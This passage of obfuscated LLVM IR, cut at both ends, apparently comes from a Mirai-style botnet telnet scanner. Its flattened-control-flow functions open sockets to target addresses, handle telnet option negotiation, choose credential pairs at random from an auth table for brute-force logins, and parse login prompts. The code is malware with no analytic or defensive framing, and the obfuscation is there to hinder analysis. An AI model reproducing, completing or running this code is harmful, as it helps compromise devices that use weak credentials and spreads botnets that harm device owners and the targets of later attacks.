    i32 769219011, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp ne i32 %.reload, -1
  %10 = select i1 %9, i32 42984607, i32 -1387705839
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %12, i32 0, i32 2
  %14 = load i32, i32* %13, align 8
  %15 = call i32 @close(i32 %14)
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 2
  store i32 -1, i32* %17, align 8
  store i32 -1387705839, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 2
  store i32 %19, i32* %21, align 8
  %22 = icmp eq i32 %19, -1
  %23 = select i1 %22, i32 -45357395, i32 -260344524
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 769219011, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 1
  %28 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 4
  %30 = icmp ugt i32 %29, -1
  %31 = select i1 %30, i32 -1460337148, i32 -1005217885
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %34 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %33, i32 0, i32 1
  %35 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %34, i32 0, i32 1
  store i32 -1, i32* %35, align 4
  store i32 -1005217885, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 4
  store i32 0, i32* %38, align 8
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %40, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 8192, i32 4, i1 false)
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 2
  %44 = load i32, i32* %43, align 8
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 2
  %47 = load i32, i32* %46, align 8
  %48 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 3, i32 0)
  %49 = or i32 2048, %48
  %50 = call i32 (i32, i32, ...) @fcntl(i32 %44, i32 4, i32 %49)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 15
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 13
  %59 = load i16, i16* %58, align 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @fake_time, align 4
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 3
  store i32 %61, i32* %63, align 4
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 16
  store i32 1, i32* %65, align 8
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 2
  %68 = load i32, i32* %67, align 8
  %69 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i32 @connect(i32 %68, %struct.sockaddr* %72, i32 16)
  store i32 769219011, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %32, %25, %24, %18, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @fdclose(%struct.scanner_connection*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %5, i32 0, i32 8
  %7 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 16, i32 4, i1 false)
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 1
  %10 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %9, i32 0, i32 0
  store i32 0, i32* %10, align 8
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 12
  store i8 0, i8* %12, align 1
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 9
  store i8 0, i8* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 1
  %17 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %16, i32 0, i32 1
  store i32 -1, i32* %17, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 5
  store i32 0, i32* %19, align 4
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 6
  store i32 0, i32* %21, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 2
  %24 = load i32, i32* %23, align 8
  store i32 %24, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 820842023, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 820842023, label %first
    i32 -48110992, label %27
    i32 271028998, label %32
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %25 = icmp ne i32 %.reload, -1
  %26 = select i1 %25, i32 -48110992, i32 271028998
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = call i32 @close(i32 %30)
  store i32 271028998, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %34 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %33, i32 0, i32 2
  store i32 -1, i32* %34, align 8
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 16
  store i32 0, i32* %36, align 8
  ret void

loopEnd:                                          ; preds = %27, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  %switchVar = alloca i32
  store i32 1099079835, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1099079835, label %9
    i32 1215275741, label %14
    i32 878281618, label %26
    i32 -1380103518, label %27
    i32 1318605010, label %39
    i32 676586985, label %44
    i32 -1251041164, label %45
    i32 -65286308, label %46
    i32 -1487113828, label %49
    i32 1415008922, label %50
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  %13 = select i1 %12, i32 1215275741, i32 -1487113828
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i16, i16* %3, align 2
  %16 = zext i16 %15 to i32
  %17 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %18 = load i32, i32* %2, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %17, i64 %19
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %20, i32 0, i32 2
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = icmp slt i32 %16, %23
  %25 = select i1 %24, i32 878281618, i32 -1380103518
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i32 -65286308, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16, i16* %3, align 2
  %29 = zext i16 %28 to i32
  %30 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %31 = load i32, i32* %2, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %30, i64 %32
  %34 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %33, i32 0, i32 3
  %35 = load i16, i16* %34, align 2
  %36 = zext i16 %35 to i32
  %37 = icmp slt i32 %29, %36
  %38 = select i1 %37, i32 1318605010, i32 676586985
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* %2, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  store %struct.scanner_auth* %43, %struct.scanner_auth** %1, align 8
  store i32 1415008922, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -1251041164, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -65286308, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %2, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %2, align 4
  store i32 1099079835, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  store i32 1415008922, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %51

loopEnd:                                          ; preds = %49, %46, %45, %44, %39, %27, %26, %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1447792030, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1447792030, label %first
    i32 -1038599665, label %21
    i32 -2045891425, label %22
    i32 1686666630, label %27
    i32 -779541481, label %36
    i32 -1043340055, label %41
    i32 1822147150, label %42
    i32 -159145372, label %45
    i32 2081381097, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp sgt i32 %.reload, 0
  %20 = select i1 %19, i32 -1038599665, i32 2081381097
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  store i32 -2045891425, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %10, align 4
  %24 = load i32, i32* %9, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 1686666630, i32 -159145372
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  %35 = select i1 %34, i32 -779541481, i32 -1043340055
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  store i8 65, i8* %40, align 1
  store i32 -1043340055, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 1822147150, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %10, align 4
  store i32 -2045891425, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 2081381097, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  ret i32 %47

loopEnd:                                          ; preds = %45, %42, %41, %36, %27, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  %switchVar = alloca i32
  store i32 -597715188, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -597715188, label %11
    i32 -1616650040, label %18
    i32 1319414165, label %24
    i32 -1782954029, label %25
    i32 458157228, label %31
    i32 -879388489, label %37
    i32 -816415637, label %38
    i32 144460797, label %45
    i32 1798076150, label %50
    i32 -1036120224, label %57
    i32 1813223431, label %65
    i32 -306452788, label %66
    i32 519969325, label %73
    i32 1833480275, label %74
    i32 441674966, label %89
    i32 262909444, label %90
    i32 -983377360, label %96
    i32 -2018724599, label %97
    i32 -867240706, label %98
    i32 219022932, label %102
    i32 -63967215, label %111
    i32 156858780, label %116
    i32 2007014504, label %125
    i32 1571150429, label %130
    i32 -1796696869, label %131
    i32 1867350319, label %132
    i32 1263624258, label %135
    i32 790763189, label %145
    i32 1809526032, label %146
    i32 98327837, label %147
    i32 -492807008, label %148
    i32 1727485012, label %149
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 4
  %15 = load i32, i32* %14, align 8
  %16 = icmp slt i32 %12, %15
  %17 = select i1 %16, i32 -1616650040, i32 1727485012
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp ne i32 %21, 255
  %23 = select i1 %22, i32 1319414165, i32 -1782954029
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 1727485012, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %4, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 255
  %30 = select i1 %29, i32 458157228, i32 98327837
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %33 = load i8*, i8** %4, align 8
  %34 = call signext i8 @can_consume(%struct.scanner_connection* %32, i8* %33, i32 1)
  %35 = icmp ne i8 %34, 0
  %36 = select i1 %35, i32 -816415637, i32 -879388489
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 1727485012, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8*, i8** %4, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 255
  %44 = select i1 %43, i32 144460797, i32 1798076150
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 2
  store i8* %47, i8** %4, align 8
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 2
  store i32 %49, i32* %3, align 4
  store i32 -597715188, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %4, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 -1036120224, i32 441674966
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %59 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %61 = load i8*, i8** %4, align 8
  %62 = call signext i8 @can_consume(%struct.scanner_connection* %60, i8* %61, i32 2)
  %63 = icmp ne i8 %62, 0
  %64 = select i1 %63, i32 -306452788, i32 1813223431
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1727485012, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 2
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp ne i32 %70, 31
  %72 = select i1 %71, i32 519969325, i32 1833480275
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 262909444, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 3
  store i8* %76, i8** %4, align 8
  %77 = load i32, i32* %3, align 4
  %78 = add nsw i32 %77, 3
  store i32 %78, i32* %3, align 4
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 2
  %81 = load i32, i32* %80, align 8
  %82 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %83 = call i64 @send(i32 %81, i8* %82, i64 3, i32 16384)
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 2
  %86 = load i32, i32* %85, align 8
  %87 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %88 = call i64 @send(i32 %86, i8* %87, i64 9, i32 16384)
  store i32 790763189, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 262909444, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %92 = load i8*, i8** %4, align 8
  %93 = call signext i8 @can_consume(%struct.scanner_connection* %91, i8* %92, i32 2)
  %94 = icmp ne i8 %93, 0
  %95 = select i1 %94, i32 -2018724599, i32 -983377360
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 1727485012, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -867240706, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %5, align 4
  %100 = icmp slt i32 %99, 3
  %101 = select i1 %100, i32 219022932, i32 1263624258
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %5, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 253
  %110 = select i1 %109, i32 -63967215, i32 156858780
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  store i8 -4, i8* %115, align 1
  store i32 -1796696869, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i8*, i8** %4, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 251
  %124 = select i1 %123, i32 2007014504, i32 1571150429
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i8*, i8** %4, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8 -3, i8* %129, align 1
  store i32 1571150429, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  store i32 -1796696869, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 1867350319, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %5, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %5, align 4
  store i32 -867240706, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %136, i32 0, i32 2
  %138 = load i32, i32* %137, align 8
  %139 = load i8*, i8** %4, align 8
  %140 = call i64 @send(i32 %138, i8* %139, i64 3, i32 16384)
  %141 = load i8*, i8** %4, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 3
  store i8* %142, i8** %4, align 8
  %143 = load i32, i32* %3, align 4
  %144 = add nsw i32 %143, 3
  store i32 %144, i32* %3, align 4
  store i32 790763189, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1809526032, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 98327837, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -492807008, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 -597715188, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %3, align 4
  ret i32 %150

loopEnd:                                          ; preds = %148, %147, %146, %145, %135, %132, %131, %130, %125, %116, %111, %102, %98, %97, %96, %90, %89, %74, %73, %66, %65, %57, %50, %45, %38, %37, %31, %25, %24, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_login_prompt(%struct.scanner_connection*, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 -1, i32* %8, align 4
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = sub nsw i32 %11, 1
  store i32 %12, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -2076587211, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2076587211, label %13
    i32 -696512970, label %17
    i32 597650566, label %27
    i32 1333912999, label %37
    i32 -1070777904, label %47
    i32 503769576, label %57
    i32 -2068632645, label %67
    i32 -1548939038, label %71
    i32 -965462421, label %74
    i32 10524305, label %75
    i32 -1831244699, label %78
    i32 1796329468, label %82
    i32 -1642499950, label %86
    i32 -1832260825, label %96
    i32 -1416889976, label %98
    i32 -856662206, label %108
    i32 -2076789876, label %110
